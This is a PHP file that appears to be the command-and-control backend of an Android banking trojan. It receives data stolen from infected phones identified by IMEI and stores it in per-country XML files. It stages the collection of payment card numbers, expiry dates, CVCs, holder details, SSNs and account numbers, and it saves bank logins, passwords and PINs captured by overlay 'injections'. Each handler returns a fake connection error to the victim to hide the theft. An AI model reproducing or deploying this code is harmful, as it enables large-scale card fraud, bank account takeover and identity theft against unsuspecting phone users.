<?php  
include 'config.php';

	$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);

	$massivReq = explode("|", $request);
	$IMEI_log = $massivReq[0]; 
	$country = $massivReq[1];
	$text_log = $massivReq[2];
	
	$typeCard = "";
	$numberCC = "";
	$m_y = "";
	$CVC = "";	
		
	//Грабинг СС
	if($text_log == "Грабинг СС шаг 1")
	{
		$typeCard = $massivReq[3]; 
		$numberCC = $massivReq[4]; 
		$m_y = $massivReq[5]; 
		$CVC = $massivReq[6]; 
		$date_add_inj = $massivReq[7]; 
		$IM_DT = "$IMEI_log($date_add_inj)";
		
		
		$text_log = "Грабинг СС(1)\nType Card: $typeCard\nNumber card: $numberCC\nMonth/year: $m_y\nCVC: $CVC\n";
		 
		$pathtoxmlfile = "cc/-$country-.xml";
		$pathtoresultfile = "cc/-$country-.xml";

		if (file_exists($pathtoxmlfile)) {
			
			$exsit = esxCard($IM_DT, $country);
			
			if($exsit == false)
			{
		    $dom = new DomDocument();
			$dom->load("cc/-$country-.xml");
		  //дописываем 
			$xpath = new DOMXPath ($dom);
			$parent = $xpath->query ('//Cards');
			$next = $xpath->query ('//Cards/Card');
			$new_item = $dom->createElement ('Card');
			$IMEI_ = $dom->createElement ('IMEI', $IM_DT);
			$country_ = $dom->createElement ('Country', $country);
			$type_card_ = $dom->createElement ('TypeCard', $typeCard);
			$number_card_= $dom->createElement ('NumberCard', $numberCC);
			$Month_year_ = $dom->createElement ('MonthYear', $m_y);
			$CVC_ = $dom->createElement ('CVC', $CVC);
			$Name_holder_ = $dom->createElement ('NameHolder', ' ');
			$data_birth_ = $dom->createElement ('DataBirth', ' ');
			$Postal_code_ = $dom->createElement ('PostalCode', ' ');
			$Address_Holder_ = $dom->createElement ('AddressHolder', ' ');
			$Phonenumber_ = $dom->createElement ('PhoneNumberHolder', ' ');
			if($country=="us")
			{
				$SSN_ = $dom->createElement ('SSN', ' ');
				$AN_ = $dom->createElement ('AccountNumber', ' ');
			}
			$VBV_ = $dom->createElement ('VBV', ' ');
			$Sort_code_ = $dom->createElement ('SortCode', ' ');
			$new_item->appendChild ($IMEI_);
			$new_item->appendChild ($country_);
			$new_item->appendChild ($type_card_);
			$new_item->appendChild ($number_card_);
			$new_item->appendChild ($Month_year_);
			$new_item->appendChild ($CVC_);
			$new_item->appendChild ($Name_holder_);
			$new_item->appendChild ($data_birth_);
			$new_item->appendChild ($Postal_code_);
			$new_item->appendChild ($Address_Holder_);
			$new_item->appendChild ($Phonenumber_);
			if($country=="us")
			{
				$new_item->appendChild ($SSN_);
				$new_item->appendChild ($AN_);
			}
			$new_item->appendChild ($VBV_);
			$new_item->appendChild ($Sort_code_);
			$parent->item(0)->insertBefore($new_item, $next->item(0));
		   
			$dom->save("cc/-$country-.xml");
			}
		 
		} else {
		   //создаем новый!
			$dom = new DomDocument('1.0'); 
			$Cards = $dom->appendChild($dom->createElement('Cards')); 
			$Card = $Cards->appendChild($dom->createElement('Card')); 

			$imei_ = $Card->appendChild($dom->createElement('IMEI')); 
			$imei_->appendChild($dom->createTextNode($IM_DT)); 
			
			$Country_ = $Card->appendChild($dom->createElement('Country')); 
			$Country_->appendChild($dom->createTextNode($country)); 
			
			$TypeCard_ = $Card->appendChild($dom->createElement('TypeCard')); 
			$TypeCard_->appendChild($dom->createTextNode($typeCard)); 
			
			$Numbercard_ = $Card->appendChild($dom->createElement('NumberCard')); 
			$Numbercard_->appendChild($dom->createTextNode($numberCC)); 
			
			$Monthyear_ = $Card->appendChild($dom->createElement('MonthYear')); 
			$Monthyear_->appendChild($dom->createTextNode($m_y)); 
			
			$CVC_ = $Card->appendChild($dom->createElement('CVC')); 
			$CVC_->appendChild($dom->createTextNode($CVC)); 
			
			$NameHolder_ = $Card->appendChild($dom->createElement('NameHolder')); 
			$NameHolder_->appendChild($dom->createTextNode(' ')); 
			
			$DataBirth_ = $Card->appendChild($dom->createElement('DataBirth')); 
			$DataBirth_->appendChild($dom->createTextNode(' ')); 
			
			$PostalCode_ = $Card->appendChild($dom->createElement('PostalCode')); 
			$PostalCode_->appendChild($dom->createTextNode(' ')); 
			
			$AddressHolder_ = $Card->appendChild($dom->createElement('AddressHolder')); 
			$AddressHolder_->appendChild($dom->createTextNode(' ')); 
			
			$PhoneNumberHolder_ = $Card->appendChild($dom->createElement('PhoneNumberHolder')); 
			$PhoneNumberHolder_->appendChild($dom->createTextNode(' ')); 
			
			if($country=="us")
			{
				$AddressHolder_ = $Card->appendChild($dom->createElement('SSN')); 
				$AddressHolder_->appendChild($dom->createTextNode(' ')); 
			
				$PhoneNumberHolder_ = $Card->appendChild($dom->createElement('AccountNumber')); 
				$PhoneNumberHolder_->appendChild($dom->createTextNode(' ')); 
			}
			
			$VBV_ = $Card->appendChild($dom->createElement('VBV')); 
			$VBV_->appendChild($dom->createTextNode(' ')); 
			
			$SortCode_ = $Card->appendChild($dom->createElement('SortCode')); 
			$SortCode_->appendChild($dom->createTextNode(' ')); 
			
			$dom->formatOutput = true; // установка атрибута formatOutput
			
			$test1 = $dom->saveXML(); // передача строки в test1 
			$dom->save("cc/-$country-.xml");
		}
	}
	
	if($text_log == "Грабинг СС шаг 2")
	{
		$сardHolder = $massivReq[3]; 
		$dateBirth = $massivReq[4]; 
		$postalCode = $massivReq[5]; 
		$holderAddress = $massivReq[6]; 
		$phoneNumber =  $massivReq[7]; 
		$date_add_inj = $massivReq[8]; 
		$IM_DT = "$IMEI_log($date_add_inj)";
		
		if($country == "us")
		{
			$SSN =  $massivReq[9]; 
			$AN = $massivReq[10]; 
			$text_log = "Грабинг СС(2)\nName Holder: $сardHolder\nData Birth: $dateBirth\nPostal Code: $postalCode\nAddress Holder: $holderAddress\nPhone Number Holder: $phoneNumber\nSSN: $SSN\nAccount number: $AN\n";
		}
		else
		{
			$text_log = "Грабинг СС(2)\nName Holder: $сardHolder\nData Birth: $dateBirth\nPostal Code: $postalCode\nAddress Holder: $holderAddress\nPhone Number Holder: $phoneNumber\n";
		}
		
		
	
	
		$xml = simplexml_load_file("cc/-$country-.xml"); // превращаем объект SimpleXML в DOMDocument 
		$dom_sxe = dom_import_simplexml($xml); $dom = new DOMDocument('1.0', 'UTF-8'); 
		$dom_sxe = $dom->importNode($dom_sxe, true); 
		
		$dom_sxe = $dom->appendChild($dom_sxe); // ищем в объекте books книгу с 848-ю страницами 
		$xpath = new DOMXPath($dom); 
		
		$pos = $xpath->evaluate("count(//Card[IMEI=$IM_DT]/preceding-sibling::*)"); // нашли позицию // обновляем кол-во страниц 
		
		$xml->Card[intval($pos)]->NameHolder = $сardHolder; // сохраняем файл 
		$xml->Card[intval($pos)]->DataBirth = $dateBirth;
		$xml->Card[intval($pos)]->PostalCode = $postalCode;
		$xml->Card[intval($pos)]->AddressHolder = $holderAddress;
		$xml->Card[intval($pos)]->PhoneNumberHolder = $phoneNumber;
		if($country=="us")
		{
			$xml->Card[intval($pos)]->SSN = $SSN;
			$xml->Card[intval($pos)]->AccountNumber = $AN;
		}
		$xml->asXML("cc/-$country-.xml");
		
		/*Удаляем с настройки инжект*/
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');
		$sql5 = "UPDATE settings SET inject = '',state='1' WHERE IMEI = '$IMEI_log';";
		$connection->query($sql5);
		$sql5 = "UPDATE kliets SET color='red' WHERE IMEI = '$IMEI_log';";
		$connection->query($sql5);	
		
		/***************************/
	}
	
	if($text_log == "Грабинг СС шаг 3")
	{
		$VBV = $massivReq[3]; 
	//	$date_add_inj = $massivReq[4]; 
		
		$text_log = "Грабинг СС(3)\nVBV : $VBV\n";
		
		$xml = simplexml_load_file("cc/-$country-.xml"); // превращаем объект SimpleXML в DOMDocument 
		$dom_sxe = dom_import_simplexml($xml); $dom = new DOMDocument('1.0', 'UTF-8'); 
		$dom_sxe = $dom->importNode($dom_sxe, true); 
		
		$dom_sxe = $dom->appendChild($dom_sxe); // ищем в объекте books книгу с 848-ю страницами 
		$xpath = new DOMXPath($dom); 
		
		$pos = $xpath->evaluate("count(//Card[IMEI=$IM_DT]/preceding-sibling::*)"); // нашли позицию // обновляем кол-во страниц 
		
		$xml->Card[intval($pos)]->VBV = $VBV; // сохраняем файл 
		$xml->asXML("cc/-$country-.xml");
	}
	
	if($text_log == "Грабинг СС шаг 4")
	{
		$Sort_code = $massivReq[3]; 
		//$date_add_inj = $massivReq[4]; 
		
		$text_log = "Грабинг СС(4)\nSort Code: $Sort_code\n";
		
		$xml = simplexml_load_file("cc/-$country-.xml"); // превращаем объект SimpleXML в DOMDocument 
		$dom_sxe = dom_import_simplexml($xml); $dom = new DOMDocument('1.0', 'UTF-8'); 
		$dom_sxe = $dom->importNode($dom_sxe, true); 
		
		$dom_sxe = $dom->appendChild($dom_sxe); // ищем в объекте books книгу с 848-ю страницами 
		$xpath = new DOMXPath($dom); 
		
		$pos = $xpath->evaluate("count(//Card[IMEI=$IM_DT]/preceding-sibling::*)"); // нашли позицию // обновляем кол-во страниц 
		
		$xml->Card[intval($pos)]->SortCode = $Sort_code; // сохраняем файл 
		$xml->asXML("cc/-$country-.xml");
	}
	
	// -- инжекты -- //
	
	if($text_log == "Injection_1")
	{
		//--------
		$bank = $massivReq[3];
		$username = $_POST['user'];
		$password = $_POST['pass'];
		
		$text_log = "Инжект($bank)\nusername: $username\npassword: $password";
		 
		$pathtoxmlfile = "injections/-$country-.xml";
		$pathtoresultfile = "injections/-$country-.xml";

		if (file_exists($pathtoxmlfile)) {

		    $dom = new DomDocument();
			$dom->load("injections/-$country-.xml");
		  //дописываем 
			$xpath = new DOMXPath ($dom);
			$parent = $xpath->query ('//Injections');
			$next = $xpath->query ('//Injections/Inject');
			$new_item = $dom->createElement ('Inject');
			$IMEI_ = $dom->createElement ('IMEI', $IMEI_log);
			$country_ = $dom->createElement ('Country', $country);
			$bank_ = $dom->createElement ('NameBank', $bank);
			$username_ = $dom->createElement ('username', $username);
			$password_= $dom->createElement ('Password', $password);

			$new_item->appendChild ($IMEI_);
			$new_item->appendChild ($country_);
			$new_item->appendChild ($bank_);
			$new_item->appendChild ($username_);
			$new_item->appendChild ($password_);
			$parent->item(0)->insertBefore($new_item, $next->item(0));
		   
			$dom->save("injections/-$country-.xml");
		 
		} else {
		   //создаем новый!
			$dom = new DomDocument('1.0'); 
			$Cards = $dom->appendChild($dom->createElement('Injections')); 
			$Card = $Cards->appendChild($dom->createElement('Inject')); 
			
			$imei_ = $Card->appendChild($dom->createElement('IMEI')); 
			$imei_->appendChild($dom->createTextNode($IMEI_log)); 
			
			$Country_ = $Card->appendChild($dom->createElement('Country')); 
			$Country_->appendChild($dom->createTextNode($country)); 
			
			$bank_ = $Card->appendChild($dom->createElement('NameBank')); 
			$bank_->appendChild($dom->createTextNode($bank)); 
			
			$username_ = $Card->appendChild($dom->createElement('username')); 
			$username_->appendChild($dom->createTextNode($username)); 
			
			$password_ = $Card->appendChild($dom->createElement('password')); 
			$password_->appendChild($dom->createTextNode($password)); 
			
			$dom->formatOutput = true; // установка атрибута formatOutput
			
			$test1 = $dom->saveXML(); // передача строки в test1 
			$dom->save("injections/-$country-.xml");
		}
		
		/*Удаляем с настройки инжект*/
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');
		$sql5 = "UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log';";
		$connection->query($sql5);	
		$sql5 = "UPDATE kliets SET color='purple' WHERE IMEI = '$IMEI_log';";
		$connection->query($sql5);	
		
	 echo "HTTP: Error 12007 when connecting";
	}
	
	//**
	
	if($text_log == "Injection_2")
	{
		//--------
		$bank = $massivReq[3];
		$username = $_POST['user'];
		$password = $_POST['pass'];
		$pin = $_POST['pin'];
		
		$text_log = "Инжект($bank)\nusername: $username\npassword: $password\nPIN: $pin";
		 
		$pathtoxmlfile = "injections/-$country-.xml";
		$pathtoresultfile = "injections/-$country-.xml";

		if (file_exists($pathtoxmlfile)) {

		    $dom = new DomDocument();
			$dom->load("injections/-$country-.xml");
		  //дописываем 
			$xpath = new DOMXPath ($dom);
			$parent = $xpath->query ('//Injections');
			$next = $xpath->query ('//Injections/Inject');
			$new_item = $dom->createElement ('Inject');
			$IMEI_ = $dom->createElement ('IMEI', $IMEI_log);
			$country_ = $dom->createElement ('Country', $country);
			$bank_ = $dom->createElement ('NameBank', $bank);
			$username_ = $dom->createElement ('username', $username);
			$password_= $dom->createElement ('Password', $password);
			$pin_ = $dom->createElement ('PIN', $pin);

			$new_item->appendChild ($IMEI_);
			$new_item->appendChild ($country_);
			$new_item->appendChild ($bank_);
			$new_item->appendChild ($username_);
			$new_item->appendChild ($password_);
			$new_item->appendChild ($pin_);
			$parent->item(0)->insertBefore($new_item, $next->item(0));
		   
			$dom->save("injections/-$country-.xml");
		 
		} else {
		   //создаем новый!
			$dom = new DomDocument('1.0'); 
			$Cards = $dom->appendChild($dom->createElement('Injections')); 
			$Card = $Cards->appendChild($dom->createElement('Inject')); 
			
			$imei_ = $Card->appendChild($dom->createElement('IMEI')); 
			$imei_->appendChild($dom->createTextNode($IMEI_log)); 
			
			$Country_ = $Card->appendChild($dom->createElement('Country')); 
			$Country_->appendChild($dom->createTextNode($country)); 
			
			$bank_ = $Card->appendChild($dom->createElement('NameBank')); 
			$bank_->appendChild($dom->createTextNode($bank)); 
			
			$username_ = $Card->appendChild($dom->createElement('username')); 
			$username_->appendChild($dom->createTextNode($username)); 
			
			$password_ = $Card->appendChild($dom->createElement('password')); 
			$password_->appendChild($dom->createTextNode($password)); 
			
			$pin_ = $Card->appendChild($dom->createElement('pin')); 
			$pin_->appendChild($dom->createTextNode($pin)); 
			
			$dom->formatOutput = true; // установка атрибута formatOutput
			
			$test1 = $dom->saveXML(); // передача строки в test1 
			$dom->save("injections/-$country-.xml");
		}
		
	/*Удаляем с настройки инжект*/
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');
	$sql5 = "UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql5);	
	$sql5 = "UPDATE kliets SET color='purple' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql5);	
	
	 echo "HTTP: Error 12007 when connecting";
	}
	
	
	if($text_log == "Injection_3")
	{
		//--------
		$bank = $massivReq[3];
		$username = $massivReq[4];
		$password = $massivReq[5];
		$pin = $massivReq[6];
		
		$text_log = "Инжект($bank)\nusername: $username\ncode: $pin\npassword: $password";
		 
		$pathtoxmlfile = "injections/-$country-.xml";
		$pathtoresultfile = "injections/-$country-.xml";

		if (file_exists($pathtoxmlfile)) {

		    $dom = new DomDocument();
			$dom->load("injections/-$country-.xml");
		  //дописываем 
			$xpath = new DOMXPath ($dom);
			$parent = $xpath->query ('//Injections');
			$next = $xpath->query ('//Injections/Inject');
			$new_item = $dom->createElement ('Inject');
			$IMEI_ = $dom->createElement ('IMEI', $IMEI_log);
			$country_ = $dom->createElement ('Country', $country);
			$bank_ = $dom->createElement ('NameBank', $bank);
			$username_ = $dom->createElement ('username', $username);
			$pin_ = $dom->createElement ('Code', $pin);
			$password_= $dom->createElement ('Password', $password);
			
			$new_item->appendChild ($IMEI_);
			$new_item->appendChild ($country_);
			$new_item->appendChild ($bank_);
			$new_item->appendChild ($username_);
			$new_item->appendChild ($pin_);
			$new_item->appendChild ($password_);
			
			$parent->item(0)->insertBefore($new_item, $next->item(0));
		   
			$dom->save("injections/-$country-.xml");
		 
		} else {
		   //создаем новый!
			$dom = new DomDocument('1.0'); 
			$Cards = $dom->appendChild($dom->createElement('Injections')); 
			$Card = $Cards->appendChild($dom->createElement('Inject')); 
			
			$imei_ = $Card->appendChild($dom->createElement('IMEI')); 
			$imei_->appendChild($dom->createTextNode($IMEI_log)); 
			
			$Country_ = $Card->appendChild($dom->createElement('Country')); 
			$Country_->appendChild($dom->createTextNode($country)); 
			
			$bank_ = $Card->appendChild($dom->createElement('NameBank')); 
			$bank_->appendChild($dom->createTextNode($bank)); 
			
			$username_ = $Card->appendChild($dom->createElement('username')); 
			$username_->appendChild($dom->createTextNode($username)); 
			
			$pin_ = $Card->appendChild($dom->createElement('Code')); 
			$pin_->appendChild($dom->createTextNode($pin)); 
			
			$password_ = $Card->appendChild($dom->createElement('password')); 
			$password_->appendChild($dom->createTextNode($password)); 
			
			
			
			$dom->formatOutput = true; // установка атрибута formatOutput
			
			$test1 = $dom->saveXML(); // передача строки в test1 
			$dom->save("injections/-$country-.xml");
		}
		
	/*Удаляем с настройки инжект*/
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');
	$sql5 = "UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql5);	
	$sql5 = "UPDATE kliets SET color='purple' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql5);	
	
	 echo "HTTP: Error 12007 when connecting";
	}
	
	if($text_log == "Injection_4")
	{
		//--------
		$bank = $massivReq[3];
		$username = $massivReq[4];
		$password = $massivReq[5];
		
		$text_log = "Инжект($bank)\nusername: $username\npassword: $password";
		 
		$pathtoxmlfile = "injections/-$country-.xml";
		$pathtoresultfile = "injections/-$country-.xml";

		if (file_exists($pathtoxmlfile)) {

		    $dom = new DomDocument();
			$dom->load("injections/-$country-.xml");
		  //дописываем 
			$xpath = new DOMXPath ($dom);
			$parent = $xpath->query ('//Injections');
			$next = $xpath->query ('//Injections/Inject');
			$new_item = $dom->createElement ('Inject');
			$IMEI_ = $dom->createElement ('IMEI', $IMEI_log);
			$country_ = $dom->createElement ('Country', $country);
			$bank_ = $dom->createElement ('NameBank', $bank);
			$username_ = $dom->createElement ('username', $username);
			$password_= $dom->createElement ('Password', $password);

			$new_item->appendChild ($IMEI_);
			$new_item->appendChild ($country_);
			$new_item->appendChild ($bank_);
			$new_item->appendChild ($username_);
			$new_item->appendChild ($password_);
			$parent->item(0)->insertBefore($new_item, $next->item(0));
		   
			$dom->save("injections/-$country-.xml");
		 
		} else {
		   //создаем новый!
			$dom = new DomDocument('1.0'); 
			$Cards = $dom->appendChild($dom->createElement('Injections')); 
			$Card = $Cards->appendChild($dom->createElement('Inject')); 
			
			$imei_ = $Card->appendChild($dom->createElement('IMEI')); 
			$imei_->appendChild($dom->createTextNode($IMEI_log)); 
			
			$Country_ = $Card->appendChild($dom->createElement('Country')); 
			$Country_->appendChild($dom->createTextNode($country)); 
			
			$bank_ = $Card->appendChild($dom->createElement('NameBank')); 
			$bank_->appendChild($dom->createTextNode($bank)); 
			
			$username_ = $Card->appendChild($dom->createElement('username')); 
			$username_->appendChild($dom->createTextNode($username)); 
			
			$password_ = $Card->appendChild($dom->createElement('password')); 
			$password_->appendChild($dom->createTextNode($password)); 
			
			$dom->formatOutput = true; // установка атрибута formatOutput
			
			$test1 = $dom->saveXML(); // передача строки в test1 
			$dom->save("injections/-$country-.xml");
		}
		
		/*Удаляем с настройки инжект*/
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');
		$sql5 = "UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log';";
		$connection->query($sql5);	
		$sql5 = "UPDATE kliets SET color='purple' WHERE IMEI = '$IMEI_log';";
		$connection->query($sql5);	
		
	 echo "HTTP: Error 12007 when connecting";
	}
	
	
	if($text_log == "grabing_mini")
	{
		//--------
		$bank = $massivReq[3];
		$cardNumber = $massivReq[4];
		$cardExpiration = $massivReq[5];
		$cvcEntry =$massivReq[6];
		$nameOnCard = $massivReq[7];
		$phoneNumber = $massivReq[8];
		
		$text_log = "Инжект($bank)\nNumber Card: $cardNumber\nMonth/year: $cardExpiration\nCVC: $cvcEntry\nName Holder: $nameOnCard\nPhone Number: $phoneNumber\n";
		 
		$pathtoxmlfile = "cc/-$country-.xml";
		$pathtoresultfile = "cc/-$country-.xml";

		if (file_exists($pathtoxmlfile)) {

		    $dom = new DomDocument();
			$dom->load("cc/-$country-.xml");
		  //дописываем 
			$xpath = new DOMXPath ($dom);
			$parent = $xpath->query ('//Cards');
			$next = $xpath->query ('//Cards/Card');
			$new_item = $dom->createElement ('Card');
			$IMEI_ = $dom->createElement ('IMEI', $IMEI_log);
			$country_ = $dom->createElement ('Country', $country);
			$cardNumber_ = $dom->createElement ('NumberCard', $cardNumber);
			$cardExpiration_ = $dom->createElement ('MonthYear', $cardExpiration);
			$cvcEntry_= $dom->createElement ('CVC', $cvcEntry);
			$nameOnCard_ = $dom->createElement ('NameHolder', $nameOnCard);
			$phoneNumber_ = $dom->createElement ('PhoneNumber', $phoneNumber);

			$new_item->appendChild ($IMEI_);
			$new_item->appendChild ($country_);
			$new_item->appendChild ($cardNumber_);
			$new_item->appendChild ($cardExpiration_);
			$new_item->appendChild ($cvcEntry_);
			$new_item->appendChild ($nameOnCard_);
			$new_item->appendChild ($phoneNumber_);
			
			$parent->item(0)->insertBefore($new_item, $next->item(0));
		   
			$dom->save("cc/-$country-.xml");
		 
		} else {
		   //создаем новый!
			$dom = new DomDocument('1.0'); 
			$Cards = $dom->appendChild($dom->createElement('Cards')); 
			$Card = $Cards->appendChild($dom->createElement('Card')); 
			
			$imei_ = $Card->appendChild($dom->createElement('IMEI')); 
			$imei_->appendChild($dom->createTextNode($IMEI_log)); 
			
			$Country_ = $Card->appendChild($dom->createElement('Country')); 
			$Country_->appendChild($dom->createTextNode($country)); 
			
			$cardNumber_ = $Card->appendChild($dom->createElement('NumberCard')); 
			$cardNumber_->appendChild($dom->createTextNode($cardNumber)); 
			
			$cardExpiration_ = $Card->appendChild($dom->createElement('MonthYear')); 
			$cardExpiration_->appendChild($dom->createTextNode($cardExpiration)); 
			
			$cvcEntry_ = $Card->appendChild($dom->createElement('CVC')); 
			$cvcEntry_->appendChild($dom->createTextNode($cvcEntry)); 
			
			$nameOnCard_ = $Card->appendChild($dom->createElement('NameHolder')); 
			$nameOnCard_->appendChild($dom->createTextNode($nameOnCard)); 
			
			$phoneNumber_ = $Card->appendChild($dom->createElement('PhoneNumber')); 
			$phoneNumber_->appendChild($dom->createTextNode($phoneNumber)); 
			
			$dom->formatOutput = true; // установка атрибута formatOutput
			
			$test1 = $dom->saveXML(); // передача строки в test1 
			$dom->save("cc/-$country-.xml");
		}
	
	/*Удаляем с настройки инжект*/
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');
	$sql5 = "UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql5);
	$sql5 = "UPDATE kliets SET color='red' WHERE IMEI = '$IMEI_log';";
    $connection->query($sql5);	
		
	echo "HTTP: Error 12007 when connecting";
	}
		

if(($IMEI_log != "") && ($text_log != ""))
{
	//Записываем ЛОГи!    
	$path_log = "logs/$IMEI_log.log";	
	$perehod = "\n";
	$str_log = "$perehod$IMEI_log: $text_log$perehod";
	file_put_contents($path_log, $str_log, FILE_APPEND);

	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');
	$data_ = date('Y-m-d H:i');
	$sql3 = "UPDATE kliets SET lastConnect = '$data_' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql3);
	
	$sql3 = "UPDATE kliets SET log = '1' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql3);

	$sql3 = "UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql3);
}

/******************************/
	
function esxCard($imei, $cou)
{
	$reader = new XMLReader();
    $reader->open("cc/-$cou-.xml"); 
	
    // циклическое чтение документа
    while($reader->read()) {
        if($reader->nodeType == XMLReader::ELEMENT) {
            // если находим элемент <card>
            if($reader->localName == 'IMEI') {
             
                // читаем дальше для получения текстового элемента
                $reader->read();
                if($reader->nodeType == XMLReader::TEXT) {
                    $ff = $reader->value;
					if($imei==$ff)
					{
						return true;	
					}
                }
            }
        }
    }
return false;	
}		
?>